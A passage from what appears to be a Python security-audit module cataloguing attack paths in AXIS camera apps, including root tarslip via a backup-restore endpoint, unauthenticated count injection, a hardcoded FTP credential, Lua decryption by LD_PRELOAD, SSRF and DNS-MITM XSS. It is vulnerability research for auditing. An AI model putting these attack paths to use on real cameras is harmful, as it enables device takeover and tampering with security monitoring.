                        'the socket group, any co-resident ACAP can read full Prometheus metrics: '
                        'peer counts, session states, TURN credential material, stream IDs.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Co-resident ACAP on same device with access to ACAP package dir (2.0.x)',
                    'version': '2.0.0+',
                },
            ],
        }
        return result

    def occupancy_estimator_surface(self) -> dict:
        """
        AXIS Occupancy Estimator (tvpc) attack surface.

        appId: 220301  binary: tvpc  version: 3.16.3  arch: armv7hf (ARTPEC-7 variant (7))
        APPUSR=root  APPGRP=root  STARTMODE=respawn
        LICENSEPAGE=axis  HTTPCGIPATHS=cgipaths.conf
        source: https://www.axis.com/ftp/pub/axis/software/applications/acap/OccupancyEstimator/latest/

        Same Cognimatics codebase as Direction Detector (220302), Tailgating (557), Random Selector (492).
        All share APPUSR/APPGRP=root, debugar.cgi.org dev FTP artifact, httpd-ssl.conf.5.70 SWEET32,
        and the .restore_backup tarslip vector. Occupancy Estimator adds:
          - TCP 23456 unauth event listener (Counter0EventListenerPort)
          - TCP 4066 master/slave count-sync protocol (Counter0SlavePort / Counter0MasterPort)
          - Counter.SlavePass credential in params (cleartext in /usr/local/packages/tvpc/localdata/params.meta)
          - cm_get_cencored_credentials / decensoring — credential material in process memory
          - Authorization: Bearer %s — bearer token for upstream count-data HTTP POST
          - TrueviewVAPIX legacy VAPIX account (removed in postinst.sh, persists if upgrade fails)
          - Lua scripting engine via cog.* namespace (test.lua shipped; operator can inject Lua)

        cgipaths.conf access levels:
          viewer:    /occupancy-estimator/.api   — full counting API at lowest privilege
          operator:  /occupancy-estimator/.apioperator, /.restore_backup
          admin:     /occupancy-estimator/.apiadmin

        postinst.sh:
          - Removes TrueviewVAPIX VAPIX account (legacy hardcoded cred); partial upgrade leaves it live
          - Patches httpd-ssl.conf on firmware 5.70 — same SWEET32 vector as other tvpc variants
          - Sets apache rewrite rules that persist after uninstall (comment in code)
          - Recursively chmods tvpc tree; file permission audit needed on localdata/

        Key findings:
        1. APPUSR=root + tarslip (.restore_backup at operator) = arbitrary root file write (same as COG-1)
        2. TCP 23456 unauth event listener — inject passage events from LAN
        3. TCP 4066 slave protocol — Counter.SlavePass in cleartext params; slave connects to master
           with password from params.meta; intercept or forge master/slave sync
        4. TrueviewVAPIX legacy account — operator-level VAPIX cred; survives failed upgrades
        5. Bearer token in process strings — Authorization: Bearer %s for upstream HTTP POST of counts
        """
        result = {
            'app': 'AXIS Occupancy Estimator',
            'package': 'tvpc',
            'version': '3.16.3',
            'arch': 'armv7hf (ARTPEC-7)',
            'appId': '220301',
            'run_as': 'ROOT (APPUSR=root, APPGRP=root) — maximum blast radius',
            'license_page': 'axis',
            'codebase': 'Cognimatics (shared with Direction Detector 220302, Tailgating 557, Random Selector 492)',
            'tcp_ports': ['23456 (event listener, unauth)', '4066 (master/slave sync)'],
            'cgi_access': {
                'viewer': ['/occupancy-estimator/.api'],
                'operator': ['/occupancy-estimator/.apioperator', '/occupancy-estimator/.restore_backup'],
                'admin': ['/occupancy-estimator/.apiadmin'],
            },
            'hardcoded_artifacts': [
                'debugar.cgi.org: ftp://root:pass@192.168.0.90:21',
                'httpd-ssl.conf.5.70: DES-CBC3-SHA SWEET32 (CVE-2016-2183)',
                'TrueviewVAPIX: legacy VAPIX account removed in postinst.sh',
            ],
            'attack_paths': [
                {
                    'id': 'OE-1',
                    'title': 'Tarslip as root via .restore_backup (operator)',
                    'mechanism': (
                        'Operator POST to /occupancy-estimator/.restore_backup uploads tar.gz; '
                        'tvpc runs as root; no path traversal check on extraction target → '
                        'arbitrary root file write anywhere on camera filesystem → full takeover. '
                        'Identical to COG-1 in Direction Detector/Tailgating.'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Operator-level camera auth',
                },
                {
                    'id': 'OE-2',
                    'title': 'TCP 23456 unauth event injection',
                    'mechanism': (
                        'Counter0EventListenerPort=23456 binds a TCP listener for passage event '
                        'injection. No auth confirmed from binary strings. Attacker on LAN sends '
                        'crafted passage events → manipulates occupancy counts → false alarm '
                        'suppression or false positive generation in security monitoring.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Network access to camera TCP 23456',
                },
                {
                    'id': 'OE-3',
                    'title': 'Counter.SlavePass cleartext in params.meta + TCP 4066 slave protocol',
                    'mechanism': (
                        'Master/slave counting sync runs on TCP 4066. Counter.SlavePass stored in '
                        '/usr/local/packages/tvpc/localdata/params.meta (chmod 600, owner root). '
                        'Readable via root tarslip (OE-1 chain). SlaveAddress is operator-settable '
                        '(Counter.SlaveAddress) — set to attacker IP → SSRF to attacker slave, '
                        'or MitM slave channel to inject false counts.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Operator-level auth or root file read via OE-1',
                },
                {
                    'id': 'OE-4',
                    'title': 'TrueviewVAPIX legacy VAPIX account persistence on failed upgrade',
                    'mechanism': (
                        'postinst.sh removes TrueviewVAPIX account via pwdgrp.cgi. '
                        'If upgrade fails partway through (power loss, package error), '
                        'old tvpc remains installed with the legacy account intact. '
                        'TrueviewVAPIX is operator-level VAPIX — grants camera stream access '
                        'and VAPIX API calls without the camera admin knowing.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Failed upgrade scenario; account present on partial installs',
                },
                {
                    'id': 'OE-5',
                    'title': 'Viewer-level full counting API (/occupancy-estimator/.api)',
                    'mechanism': (
                        '.api accessible at viewer privilege. Viewer is lowest camera auth level. '
                        'Exposes full counting API including live occupancy data, counter state, '
                        'and potentially config read. Combined with OE-3 slave address write '
                        '(operator), chain: viewer reads counts + operator redirects slave → '
                        'full occupancy data exfiltration and manipulation.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Viewer-level camera auth',
                },
                {
                    'id': 'OE-6',
                    'title': 'Hardcoded dev FTP credential in production binary',
                    'mechanism': (
                        'debugar.cgi.org contains ftp://root:pass@192.168.0.90:21. '
                        'Same artifact as all Cognimatics tvpc variants. Coredump handler '
                        'may use this path to upload crash data → confirms internal '
                        'Cognimatics dev network artifact shipped in production.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'None (static artifact in binary)',
                },
            ],
        }
        return result

    def cross_line_surface(self) -> dict:
        """
        AXIS Cross Line Detection attack surface.

        appId: 3051  APPTYPE=lua  version: 1.1.5  arch: ARTPEC-5 Lua runtime
        LICENSEPAGE=axis  STARTMODE=once
        LUAFILESENCRYPTED=lineTouching.lua  encpwd blob present
        source: https://www.axis.com/ftp/pub/axis/software/applications/acap/CrossLine/latest/

        Lua-only ACAP (same runtime as VMD3 3.2.0, Digital Auto Tracking 1.0.0).
        CrossLineDetection.xml defines the rule engine: geometry.segment trigger,
        line_touching function, direction=both, bounding box + polygon + velocity enabled.

        Two Lua files:
          dbgutils.lua (plaintext) — scene history traversal, merge/split tracking,
            follows object IDs through splits/merges across frames. No obvious vuln surface
            but exposes scene data model: active objects, mergers, splits, deletes per frame.
          lineTouching.lua (encrypted, encryption="1" in XML) — main detection logic;
            encrypted with per-package encpwd blob. Same LD_PRELOAD attack applies.

        Key findings:
        1. LD_PRELOAD on Lua interpreter → plaintext recovery of lineTouching.lua (same as VMD3-1/DAT-2)
        2. CrossLineDetection.xml geometry.segment polygon float injection (NaN/Inf → geometry exception)
        3. sceneHistory / scene API exposed to dbgutils.lua — attacker-supplied Lua via cog.* namespace
           gains access to full scene object model (bounding boxes, velocities, object IDs)
        """
        result = {
            'app': 'AXIS Cross Line Detection',
            'package': 'CrossLineDetection.xml',
            'version': '1.1.5',
            'arch': 'lua (ARTPEC-5 Lua runtime)',
            'appId': '3051',
            'run_as': 'ACAP sandbox (Lua runtime)',
            'license_page': 'axis',
            'lua_files': {
                'plaintext': ['dbgutils.lua'],
                'encrypted': ['lineTouching.lua (encpwd blob)'],
            },
            'xml_config': 'CrossLineDetection.xml (geometry.segment, line_touching, direction=both)',
            'attack_paths': [
                {
                    'id': 'CL-1',
                    'title': 'LD_PRELOAD on Lua interpreter → encrypted lineTouching.lua plaintext recovery',
                    'mechanism': (
                        'Lua runtime decrypts lineTouching.lua using encpwd blob at load time. '
                        'LD_PRELOAD hook on luaL_loadbuffer or lua_pcall intercepts plaintext Lua '
                        'source before execution. Identical to VMD3-1 and DAT-2. '
                        'Recovers detection logic and any embedded parameters/credentials.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Shell access on camera (admin) or controlled firmware modification',
                },
                {
                    'id': 'CL-2',
                    'title': 'CrossLineDetection.xml geometry float injection → rule engine exception',
                    'mechanism': (
                        'CrossLine segment defined by two <point x="-0.5" y="0.0"/> elements. '
                        'Set x or y to NaN or Inf in XML config → geometry.segment constructor '
                        'receives invalid float → rule engine exception → detection disabled. '
                        'Admin can write XML config; attacker with admin writes poisoned segment '
                        'coords → CrossLine silently stops detecting crossings.'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level camera auth',
                },
                {
                    'id': 'CL-3',
                    'title': 'Scene history API exposed to Lua — object tracking data at ACAP level',
                    'mechanism': (
                        'dbgutils.lua (plaintext, always loaded) calls sceneHistory.getActiveSceneObjects, '
                        'getSceneObjectMergers, getSceneObjectSplits, getDeletedSceneObjectIds. '
                        'If an operator can inject custom Lua (via cog.* namespace extension or '
                        'by replacing dbgutils.lua), full per-frame scene data — object IDs, '
                        'positions, velocities, merge/split events — is accessible.'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'Operator ability to modify Lua scripts or XML config',
                },
            ],
        }
        return result

    def speed_monitor_surface(self) -> dict:
        """
        AXIS Speed Monitor (speedmonitor) attack surface.

        appId: 413872  binary: speedmonitor  version: 1.1.7  arch: ARM32 armhf stripped
        CGI: administrator /control.cgi, /statistics.cgi (both admin-only)

        Radar scene analytics ACAP — processes radar-tracked vehicle speed data.
        Bundles its own GStreamer 2408, libprotobuf 26, libssl.so.3, libxml2.

        Key findings:

        1. SQLite3 Track database — full radar track dump via statistics.cgi
           "SELECT * FROM Track" — admin-level statistics.cgi returns all tracked data.
           Track schema: (start_timestamp, speed, object attributes — from radarscene.proto).
           "DELETE FROM Track WHERE start_timestamp <= ?" — parameterized (good), but SELECT * is not filtered.
           Unbounded SELECT * dump at admin level = full vehicle speed/time tracking history.

        2. Radar scene protobuf from untrusted source
           libprotobuf.so.26 (bundled) deserializes radarscene.proto from provider.
           "Got invalid serialized scene size %d from provider" — size check present.
           "Received non-wellformed metadata document from radar!" — XML path also present.
           If protobuf message comes from a network radar device → malformed protobuf → crash.

        3. libxml2 metadata parsing — XML injection path
           libxml2.so.2.13.4 bundled. "Received non-wellformed metadata document from radar!"
           If radar metadata XML is user-influenced → classic XML injection/XXE surface.

        4. fdipc IPC with UID validation
           fdipc_recv_with_uid — validates caller UID on IPC socket.
           CGI socket TOCTOU race (same as radar_microbus): "Failed to remove old CGI socket" cleanup on shutdown.

        5. ax_storage (SD card/flash) write path
           axstorage used for persistent track data; ax_storage_setup_async + ax_storage_release_async.
           If storage path leaks track records to a readable path, exfil via backup or directory read.

        6. Bundled GStreamer 2408 + OpenSSL 3 + libxml2 2.13.4
           Self-contained dependency bundle — version-specific CVEs apply to bundled libs,
           not updated by firmware upgrades. libxml2 2.13.4 and libssl.so.3 need CVE audit.
        """
        result = {
            'app_id': 413872,
            'app_name': 'AXIS Speed Monitor',
            'binary_name': 'speedmonitor',
            'version': '1.1.7',
            'arch': 'ARM32 armhf stripped',
            'cgi': {'administrator': ['/control.cgi', '/statistics.cgi']},
            'sqlite_queries': [
                'SELECT MIN(start_timestamp), MAX(start_timestamp) FROM Track',
                'INSERT INTO Track (...)',
                'DELETE FROM Track WHERE start_timestamp <= ? (parameterized)',
                'SELECT * FROM Track (full dump at admin level)',
            ],
            'bundled_libs': [
                'libgstreamer-1.0.so.0.2408.0', 'libprotobuf.so.26.0.2',
                'libssl.so.3', 'libcrypto.so.3', 'libxml2.so.2.13.4',
                'libcurl.so.4.8.0', 'libsqlite3.so.0.8.6',
            ],
            'libs': [
                'libfdipc.so.1', 'libaxevent.so.1', 'libaxparameter.so.1',
                'libaxstorage.so.1', 'libjansson.so.4', 'libprotobuf.so.26',
                'libsystemd.so.0',
            ],
            'proto_messages': ['Radar.Object', 'Radar.Event', 'Radar.Scene', 'Radar.Label', 'Radar.BoundingBox', 'Radar.Velocity'],
            'ipc': 'fdipc_recv_with_uid (UID-validated)',
            'attack_paths': [
                {
                    'id': 'SPM-1',
                    'title': 'Full radar track data dump via statistics.cgi (admin)',
                    'mechanism': 'SELECT * FROM Track via admin-only statistics.cgi; all tracked vehicle speed/time data accessible without filtering',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'SPM-2',
                    'title': 'Malformed protobuf from radar device → crash',
                    'mechanism': 'libprotobuf.so.26 deserializes radarscene.proto from IPC provider; if radar device is attacker-controlled → malformed protobuf → crash/corruption',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Control of connected radar device (physical or network access)',
                },
                {
                    'id': 'SPM-3',
                    'title': 'libxml2 metadata XXE/injection via radar XML',
                    'mechanism': '"Received non-wellformed metadata document from radar!" — if XML metadata from radar source is attacker-influenced → libxml2 XXE or injection',
                    'severity': 'LOW',
                    'prerequisite': 'Control of connected radar metadata stream',
                },
                {
                    'id': 'SPM-4',
                    'title': 'Bundled lib CVE exposure (libssl.so.3, libxml2.so.2.13.4)',
                    'mechanism': 'Bundled libs not updated by firmware; libssl.so.3 and libxml2 2.13.4 may have post-ship CVEs; audit NVD for relevant CVEs',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Exploit of specific bundled lib CVE',
                },
            ],
        }
        return result

    def fence_guard_surface(self) -> dict:
        """
        AXIS Fence Guard (fenceguard) attack surface.

        appId: 47775  binary: fenceguard  version: 2.3.8  arch: aarch64 stripped
        CGI: administrator /control.cgi (from cgi.txt).

        Same SocketCameraContainer + libscene/libgeometry stack as Loitering Guard + VMD.
        Also has ONVIF_StateEventProducer (like VMD 4.4.4).

        Key findings:

        1. SocketCameraContainer — multi-camera socket connections (same as Loitering Guard)
           ZTV21SocketCameraContainer in symbol table; pattern identical to Loitering Guard.
           Admin control.cgi camera host config → socket SSRF to attacker-controlled camera.

        2. ONVIF_StateEventProducer + sendStartEvent
           Fence Guard sends ONVIF state events. ZN24ONVIF_StateEventProducer14sendStartEventERK24StateEventProducerHandleRKl
           If ONVIF state event payload is user-influenced → ONVIF event injection.

        3. libscene.so + libgeometry.so (firmware-loaded)
           Same substitution vector as VMD/Loitering Guard.

        4. LICENSEPAGE=none — no license gate, no liblicensekey bypass needed.
        """
        result = {
            'app_id': 47775,
            'app_name': 'AXIS Fence Guard',
            'binary_name': 'fenceguard',
            'version': '2.3.8',
            'arch': 'aarch64 stripped',
            'cgi': 'administrator /control.cgi (admin-only)',
            'license_page': 'none',
            'classes': ['SocketCameraContainer', 'ONVIF_StateEventProducer', 'API_VersionHandler'],
            'libs': ['libaxparameter.so.1', 'libaxhttp.so', 'libaxevent.so.1', 'libscene.so', 'libgeometry.so'],
            'attack_paths': [
                {
                    'id': 'FG-1',
                    'title': 'SocketCameraContainer SSRF via admin control.cgi',
                    'mechanism': 'Identical to Loitering Guard LG-1; admin camera host config → socket SSRF',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'FG-2',
                    'title': 'ONVIF_StateEventProducer event injection',
                    'mechanism': 'sendStartEvent sends ONVIF state events; if event payload influenced by CGI param → ONVIF injection to event consumers',
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level auth',
                },
            ],
        }
        return result

    def motion_guard_surface(self) -> dict:
        """
        AXIS Motion Guard (motionguard) attack surface.

        appId: 48170  binary: motionguard  version: 2.2.3  arch: ARM32 armhf stripped
        CGI: administrator /control.cgi (from cgi.txt). LICENSEPAGE=none.

        Same SocketCameraContainer pattern as Fence Guard + Loitering Guard.
        D-Bus proxy access: g_dbus_proxy_call_with_unix_fd_list_sync (file descriptor passing).

        Key findings:

        1. SocketCameraContainer — same multi-camera socket SSRF pattern
           Identical symbol _ZTV21SocketCameraContainerC2... present.

        2. D-Bus with FD passing (g_dbus_proxy_call_with_unix_fd_list_sync)
           File descriptor list in D-Bus call — potential FD leak/hijack surface.
           If attacker can consume FDs from the motionguard D-Bus interface → resource starvation or FD confusion.

        3. libscene.so / libgeometry.so (same as all scene analysis apps)
        """
        result = {
            'app_id': 48170,
            'app_name': 'AXIS Motion Guard',
            'binary_name': 'motionguard',
            'version': '2.2.3',
            'arch': 'ARM32 armhf stripped',
            'cgi': 'administrator /control.cgi (admin-only)',
            'license_page': 'none',
            'classes': ['SocketCameraContainer'],
            'libs': ['libaxparameter.so.1', 'libaxhttp.so', 'libaxevent.so.1', 'libscene.so', 'libgeometry.so'],
            'attack_paths': [
                {
                    'id': 'MG-1',
                    'title': 'SocketCameraContainer SSRF via admin control.cgi',
                    'mechanism': 'Same as LG-1/FG-1 pattern; camera host config → socket SSRF',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'MG-2',
                    'title': 'D-Bus FD list passing — FD leak/starvation',
                    'mechanism': 'g_dbus_proxy_call_with_unix_fd_list_sync passes FDs over D-Bus; attacker D-Bus client could consume/steal FDs from motionguard interface',
                    'severity': 'LOW',
                    'prerequisite': 'D-Bus access to motionguard interface',
                },
            ],
        }
        return result

    def live_privacy_shield_surface(self) -> dict:
        """
        AXIS Live Privacy Shield (liveprivacyshield) attack surface.

        appId: 346005  binary: liveprivacyshield  version: 2.8.8  arch: ARM32 armhf stripped
        manifest.json present. LICENSEPAGE=none. APPUSR=sdk.

        D-Bus heavy: g_dbus_proxy_call_sync, g_dbus_proxy_get_cached_property, D-Bus signals.
        Implements a video privacy masking overlay via D-Bus calls to camera firmware services.

        Key findings:

        1. FCGX socket name from environment
           "Could not get the FCGI socket name from the environment"
           CGI handled via FCGX socket; socket name from environment variable.
           If FCGI socket path is attacker-controllable (via environment manipulation in another ACAP),
           redirect CGI calls to attacker socket.

        2. D-Bus proxy to firmware service (Mor::DBusService pattern)
           "Cannot call method %s sync because the proxy is not connected"
           "Cannot handle passed Method in Mor::DBusService::execute."
           Method name passed as string to execute(); if method comes from CGI input → D-Bus method injection.

        3. PrivacyShield service D-Bus method enumeration
           Full D-Bus interface exposed; enumerate methods via introspect to find unguarded operations.
           "Failed to start PrivacyShield service. Exiting" — single point of failure; DoS = privacy masking disabled.
        """
        result = {
            'app_id': 346005,
            'app_name': 'AXIS Live Privacy Shield',
            'binary_name': 'liveprivacyshield',
            'version': '2.8.8',
            'arch': 'ARM32 armhf stripped',
            'license_page': 'none',
            'libs': ['libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libaxhttp.so', 'libaxparameter.so.1'],
            'attack_paths': [
                {
                    'id': 'LPS-1',
                    'title': 'FCGX socket name env var — socket path redirection',
                    'mechanism': 'FCGI socket path from environment variable; if another ACAP can set env before liveprivacyshield starts → redirect CGI to attacker socket',
                    'severity': 'LOW',
                    'prerequisite': 'Environment manipulation from co-resident ACAP',
                },
                {
                    'id': 'LPS-2',
                    'title': 'D-Bus method name injection via Mor::DBusService',
                    'mechanism': '"Cannot handle passed Method in Mor::DBusService::execute." — method name as string to D-Bus execute(); if CGI param feeds method name → D-Bus method injection',
                    'severity': 'MEDIUM',
                    'prerequisite': 'CGI access level (check manifest for viewer/operator exposure)',
                },
                {
                    'id': 'LPS-3',
                    'title': 'Privacy masking DoS — single point of failure',
                    'mechanism': '"Failed to start PrivacyShield service. Exiting" — crash kills masking service; video feeds unmasked until restart. Crash may be triggerable via malformed CGI.',
                    'severity': 'HIGH',
                    'note': 'GDPR/privacy violation if masking removed from streams configured for privacy protection',
                    'prerequisite': 'Ability to crash liveprivacyshield (OOM, signal, malformed CGI)',
                },
            ],
        }
        return result

    def audio_spectrum_visualizer_surface(self) -> dict:
        """
        AXIS Audio Spectrum Visualizer (AudioSpectrumVisualizer) attack surface.

        appId: 413132  binary: AudioSpectrumVisualizer  version: 2.3.0  arch: aarch64 stripped
        LICENSEPAGE=none. Admin CGI not mentioned — pure parameter-driven.

        Audio analysis visualizer — reads audio from camera microphone, renders spectrum overlay.
        cairo rendering library used (cairo_restore visible in strings).

        Key findings:

        1. Parameter value validation — integer and enum parsing
           "Unable to parse parameter %s = %s as an integer" — parameter read from axparam.
           "Unrecognizable parameter value %s for %s" — enum validation failure string.
           If parameter boundary not checked → integer overflow in spectrum calculation.
           "Invalid value of parameter Channel1SpectrumAnalyzerPosition" — named param with position value.

        2. Audio restart after stream restart
           "Unable to restart stream after restart" — stream state machine.
           If restart triggered rapidly (via parameter change callback) → potential race condition.

        3. cairo rendering surface — image output
           Cairo used for rendering spectrum overlay on video.
           If spectrum analysis data (frequency bins) is not bounds-checked before cairo drawing calls,
           out-of-bounds draw possible → cairo crash.
        """
        result = {
            'app_id': 413132,
            'app_name': 'AXIS Audio Spectrum Visualizer',
            'binary_name': 'AudioSpectrumVisualizer',
            'version': '2.3.0',
            'arch': 'aarch64 stripped',
            'license_page': 'none',
            'libs': ['libaxparameter.so.1', 'libaxevent.so.1', 'libcairo.so.2'],
            'params': {'Channel1SpectrumAnalyzerPosition': '(enum position value)'},
            'attack_paths': [
                {
                    'id': 'ASV-1',
                    'title': 'Integer overflow in spectrum parameter parsing',
                    'mechanism': '"Unable to parse parameter %s = %s as an integer" — if operator sets extreme integer value for spectrum param → overflow in audio spectrum calculation',
                    'severity': 'LOW',
                    'prerequisite': 'Operator-level axparam write',
                },
                {
                    'id': 'ASV-2',
                    'title': 'Cairo rendering OOB via unchecked spectrum bins',
                    'mechanism': 'Audio frequency bins fed to cairo rendering; if bin values not range-checked → cairo draw call with OOB coordinates → crash',
                    'severity': 'LOW',
                    'prerequisite': 'Control of audio input to camera microphone (physical)',
                },
            ],
        }
        return result

    def cognimatics_tvpc_variants_surface(self) -> dict:
        """
        Cognimatics tvpc-based AXIS apps — Direction Detector, Tailgating Detector, Random Selector.

        Shared binary: tvpc  arch: ARM32 armhf  version: 3.12.1
        CRITICAL: APPUSR="root" APPGRP="root" — binary runs as root, not as ACAP sandbox user.
        Any exploit in tvpc variants → immediate root on the camera.

        AppIDs:
          AXIS Direction Detector:   220302
          AXIS Tailgating Detector:  557 (3.12.1 ARTPEC-7)
          AXIS Random Selector:      492 (3.12.1 ARTPEC-7)

        Bundled non-binary extras: mini_snmpd, debugar.cgi, debugar.cgi.org, ntp-init,
        apache.conf, httpd-ssl.conf.5.70, curl (not stripped), modules/anon-gui/anon/

        Key findings:

        1. Runs as root — maximum blast radius
           APPUSR="root" + APPGRP="root" in package.conf.
           tvpc 4.6.110 (aarch64) removes TrueviewVAPIX default account in postinst.
           tvpc 4.0.0 S5L does NOT remove it. This 3.12.1 variant: unknown — check postinst.sh.
           Either way: code exec in this binary → direct root.

        2. debugar.cgi.org — dev FTP credential artifact in production EAP
           CoreHandler=CGI config with hardcoded "ftp://root:pass@192.168.0.90:21"
           Password "pass" for root user at dev server 192.168.0.90.
           This is a debug configuration file shipped in the production EAP unchanged.
           Attacker can read this file from a camera that installed this ACAP.

        3. debugar.cgi — coredump upload to ftp://upload.cognimatics.com
           Camera coredumps sent to Cognimatics FTP server unencrypted.
           If attacker triggers a crash (OOM, signal, or exploit), the resulting core dump
           may contain camera memory: credentials, keys, session tokens.
           FTP = plaintext in transit; Cognimatics FTP server is a third-party.

        4. mini_snmpd — bundled SNMP daemon, community string "public" default
           ARM32 stripped SNMP daemon with --community flag (default: public).
           If started by tvpc on any port, exposes camera info via SNMP.
           Even if not auto-started, binary is present in the package and can be invoked.

        5. SSLCipherSuite includes DES-CBC3-SHA (SWEET32 / CVE-2016-2183)
           httpd-ssl.conf.5.70: SSLCipherSuite AES256-SHA:AES128-SHA:DES-CBC3-SHA
           3DES cipher suite present — SWEET32 birthday attack possible on long sessions.

        6. Tarslip via .restore_backup operator CGI (same class as tvgd/tvpc 4.x)
           Both /direction-detector/.restore_backup and /people-counter/.restore_backup exposed.
           Operator-level: upload malicious tar.gz → path traversal → arbitrary file write as root.
           Blast radius: root file write (vs sandbox user in tvgd/tvpc 4.x).

        7. NTP service control in ntp-init
           ntp-init writes to /run/ntp/ntpd.conf based on get_ntp_servers output.
           If NTP server list is operator-configurable, attacker-controlled NTP server → time
           manipulation → certificate validity bypass, replay attacks.

        8. Apache includes IncludeOptional /run/apache2/vhosts/https/*.conf
           If tvpc (running as root) can write to /run/apache2/vhosts/https/, malicious .conf
           files can inject arbitrary Apache directives.

        9. postinst.sh — runs as root; check for shell injection
           All parhandclient calls in postinst.sh run as root. If any param value from
           package.conf is interpolated unsanitized into shell commands → root code exec at install.
        """
        result = {
            'binary': 'tvpc',
            'version': '3.12.1',
            'arch': 'ARM32 armhf',
            'run_as': 'ROOT (APPUSR=root, APPGRP=root) — maximum blast radius',
            'apps': {
                'AXIS Direction Detector': 220302,
                'AXIS Tailgating Detector': 557,
                'AXIS Random Selector': 492,
            },
            'cgi_endpoints': {
                'viewer': ['/direction-detector/.api', '/people-counter/.api'],
                'operator': ['/direction-detector/.apioperator', '/direction-detector/.restore_backup',
                             '/people-counter/.apioperator', '/people-counter/.restore_backup'],
                'administrator': ['/direction-detector/.apiadmin', '/people-counter/.apiadmin'],
            },
            'bundled': [
                'mini_snmpd (ARM32, stripped)',
                'curl (not stripped)',
                'debugar.cgi (coredump upload config)',
                'debugar.cgi.org (DEV CRED ARTIFACT: ftp://root:pass@192.168.0.90:21)',
                'ntp-init (NTP config writer)',
                'httpd-ssl.conf.5.70 (DES-CBC3-SHA cipher)',
                'modules/anon-gui/anon/',
            ],
            'attack_paths': [
                {
                    'id': 'COG-1',
                    'title': 'Tarslip via .restore_backup as root — arbitrary root file write',
                    'mechanism': (
                        'Operator-level .restore_backup CGI accepts tar.gz upload; '
                        'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check. '
                        'tvpc runs as root → path traversal → root file write anywhere on filesystem.'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Operator-level auth',
                    'note': 'Same class as tvgd/tvpc 4.x tarslip but ROOT execution = camera takeover',
                },
                {
                    'id': 'COG-2',
                    'title': 'debugar.cgi.org hardcoded root:pass dev FTP credential',
                    'mechanism': 'File /usr/local/packages/tvpc/debugar.cgi.org ships in production EAP; contains ftp://root:pass@192.168.0.90:21 plaintext',
                    'severity': 'MEDIUM',
                    'note': 'Credential is for dev server 192.168.0.90 (Cognimatics internal); historical/reuse risk',
                    'prerequisite': 'Read access to /usr/local/packages/tvpc/ (viewer CGI or backup)',
                },
                {
                    'id': 'COG-3',
                    'title': 'Coredump exfiltration to Cognimatics FTP server',
                    'mechanism': 'debugar.cgi: coredumps sent to ftp://upload.cognimatics.com (plaintext FTP, third-party server). Trigger crash → core dump → memory exfil via FTP.',
                    'severity': 'HIGH',
                    'prerequisite': 'Ability to trigger crash in tvpc (OOM, signal, or exploit)',
                },
                {
                    'id': 'COG-4',
                    'title': 'mini_snmpd community string "public" — camera info exposure',
                    'mechanism': 'Bundled mini_snmpd defaults to community=public; if started exposes camera SNMP subtree on UDP/TCP 161',
                    'severity': 'MEDIUM',
                    'prerequisite': 'mini_snmpd running (check if auto-started by tvpc)',
                },
                {
                    'id': 'COG-5',
                    'title': 'DES-CBC3-SHA SWEET32 (CVE-2016-2183) in bundled Apache SSL config',
                    'mechanism': 'httpd-ssl.conf.5.70 includes DES-CBC3-SHA; 32GB data over long session → birthday collision → plaintext recovery',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Long-lived HTTPS session to camera',
                },
            ],
        }
        return result

    def dat_encrypted_lua_surface(self) -> dict:
        """
        AXIS Digital Autotracking attack surface.

        appId: 6789  APPTYPE: lua  version: 1.0.0  LICENSEPAGE: none
        All Lua files encrypted (encryption="1" in DigitalAutotracking.xml).
        encpwd: binary decryption key blob used by the Axis Lua engine (not a standard ELF).

        Key findings:

        1. Encrypted Lua — source code not directly analyzable
           All 11 Lua files (main.lua, tracker.lua, etc.) are binary-encrypted.
           encpwd is the per-package decryption key; structure is proprietary to Axis Lua runtime.
           Attack: if encpwd format can be reversed or the Lua runtime decryption function is hooked
           (via LD_PRELOAD on the Lua interpreter), plaintext logic recoverable.

        2. shttpclient HTTP call in post_install.sh — unauthenticated HTTP fetch
           "response=$(shttpclient -sT 4 -o /dev/stdout http://www.axis.com/techsup/compatible_applications/cam_form.php?type=free)"
           shttpclient is Axis's internal HTTP client. No TLS. URL hardcoded but no authentication.
           If attacker controls DNS resolution for www.axis.com on the camera's network (via MITM
           or rogue DNS), post_install.sh fetches attacker-controlled JavaScript.
           The response is injected into the license form HTML rendered to the admin UI.
           This is a stored XSS vector in the admin panel via DNS MITM + install trigger.

        3. library names in XML: digitalAutotracking + system
           <library name="digitalAutotracking"/> — loaded at runtime by the Axis Lua engine.
           If the Lua engine's library search path is controllable, custom shared lib injection.

        4. APPID=6789, REQEMBDEVVERSION=1.20 — ancient platform requirement
           Embdev 1.20 is a very old AXIS SDK version. App may run on cameras that no longer
           receive firmware updates — expanded hardware attack surface.
        """
        result = {
            'app_id': 6789,
            'app_name': 'AXIS Digital Autotracking',
            'app_type': 'lua (all Lua files encrypted)',
            'version': '1.0.0',
            'license_page': 'none',
            'encpwd': 'binary decryption key blob (Axis Lua runtime proprietary format)',
            'encrypted_lua_files': [
                'middleclass.lua', 'tools.lua', 'timer.lua', 'paramreader.lua',
                'scenefilter.lua', 'superobject.lua', 'pacemaker.lua', 'regulator.lua',
                'tracker.lua', 'stabilizer.lua', 'main.lua',
            ],
            'libraries_loaded': ['digitalAutotracking', 'system'],
            'attack_paths': [
                {
                    'id': 'DAT-1',
                    'title': 'Admin XSS via DNS MITM → shttpclient license form inject',
